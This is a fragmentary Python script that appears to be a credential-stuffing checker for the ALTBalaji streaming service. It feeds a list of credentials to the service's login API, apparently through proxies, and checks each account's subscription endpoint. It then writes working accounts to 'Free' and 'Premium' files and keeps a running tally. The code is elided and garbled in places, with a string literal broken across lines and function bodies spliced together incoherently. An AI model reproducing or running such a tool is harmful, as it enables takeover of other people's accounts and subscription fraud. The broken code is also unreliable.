...
totalLoadedAcs = 0
MAX_PROXY = 0
statusFile_timeOut = 10

input_file = sys.argv[1]
output_file_free = "ALTAc_Free"+datetime.datetime.now().strftime("%d-%h-%H-%M")
output_file_paid = "ALTAc_Premium_" + \
...
loginURL = 'https://api.cloud.altbalaji.com/accounts/login?domain=IN'
subURL = "https://payment.cloud.altbalaji.com/accounts/orders?limit=12&order_status=ok&domain=IN"
...
def checkSub(page, proxy):
    authToken = page.json()['session_token']
    headv2 = {
        'accept': 'applicatio
        n/json',
        'accept-encoding': 'gzip, deflate, br',
    ...
    if len(lis) == 0:
        ...
        return str(lis[0]['product']['titles']['default']), str(lis[0]['dates']['valid_to'])
        ...
        while not q.empty():
            ...
            try:
                ...
                if(r1.status_code == 200):
                    ...
                    statusUpdate(cred, "Login Issue", container, 2)
                countLoc()
...
def statusFile():
    ...
    while True:
        template = "Total: "+str(totalLoadedAcs)+" | Checked: " + \
            str(count)+" | Free: "+str(free)+" | Premium: "+str(prem)
        f_statusFile = open(statusFile_name, 'w')
        f_statusFile.write(template)
        f_statusFile.close()
        time.sleep(statusFile_timeOut)
